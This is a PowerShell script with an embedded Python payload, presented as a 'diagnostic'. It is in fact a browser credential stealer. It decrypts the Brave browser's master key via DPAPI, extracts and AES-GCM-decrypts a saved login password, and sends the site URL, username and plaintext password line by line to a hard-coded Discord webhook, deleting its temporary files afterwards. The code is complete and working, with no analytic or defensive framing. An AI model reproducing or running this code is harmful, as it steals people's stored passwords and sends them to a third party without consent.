$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$msg)
    $body = @{content=$msg.Substring(0,[Math]::Min(1900,$msg.Length))} | ConvertTo-Json
    Invoke-RestMethod -Uri $wh -Method Post -Body $body -ContentType "application/json" | Out-Null
}

Send-Discord "🔍 Starting diagnostic..."

cd $env:TEMP\py

$pythonScript = @'
import sqlite3,os,base64,win32crypt,json
from Crypto.Cipher import AES

b=os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
ld=b+r'\Default\Login Data'
ls=b+r'\Local State'

try:
    with open(ls) as f:
        key=win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:],None,None,None,0)[1]
    
    print(f'KEY_LEN:{len(key)}')
    
    import shutil
    shutil.copy2(ld,'t.db')
    
    c=sqlite3.connect('t.db')
    r=c.execute('SELECT origin_url,username_value,password_value FROM logins WHERE username_value!="" LIMIT 1').fetchone()
    
    if r:
        print(f'URL:{r[0]}')
        print(f'USER:{r[1]}')
        print(f'ENC_LEN:{len(r[2])}')
        print(f'PREFIX_HEX:{r[2][:3].hex()}')
        print(f'FIRST_100_HEX:{r[2][:100].hex()}')
        
        nonce=r[2][3:15]
        tag=r[2][-16:]
        cipher_text=r[2][15:-16]
        
        print(f'NONCE_HEX:{nonce.hex()}')
        print(f'TAG_HEX:{tag.hex()}')
        
        try:
            aes=AES.new(key,AES.MODE_GCM,nonce=nonce)
            pwd=aes.decrypt_and_verify(cipher_text,tag)
            print(f'DECRYPTED_RAW:{pwd}')
            print(f'DECRYPTED_UTF8:{pwd.decode("utf-8",errors="ignore")}')
        except Exception as e:
            print(f'DECRYPT_ERROR:{e}')
    else:
        print('NO_PASSWORDS')
    
    c.close()
    os.remove('t.db')
    
except Exception as e:
    print(f'FATAL_ERROR:{e}')
'@

$pythonScript | Out-File "diag.py" -Encoding UTF8

$result = .\python.exe diag.py 2>&1

Remove-Item diag.py -Force

foreach ($line in $result) {
    Send-Discord $line
    Start-Sleep -Milliseconds 500
}

Send-Discord "✅ Diagnostic complete"
